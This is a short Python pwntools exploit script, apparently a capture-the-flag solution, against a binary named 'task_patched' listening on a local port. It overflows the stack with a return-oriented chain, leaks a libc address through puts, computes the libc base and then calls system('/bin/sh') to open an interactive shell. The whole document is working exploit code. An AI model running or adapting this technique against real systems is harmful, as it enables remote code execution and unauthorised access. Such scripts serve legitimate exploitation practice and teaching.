#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = elf
context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.call("rand")
rop.call("puts")
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("vuln")
p.sendline(rop.chain())

p.readline()

leak = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = leak - 0x203038 # libc specific

rop = ROP(libc)
rop.raw(b"A" * 40)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.readline()
p.clean()

p.interactive()
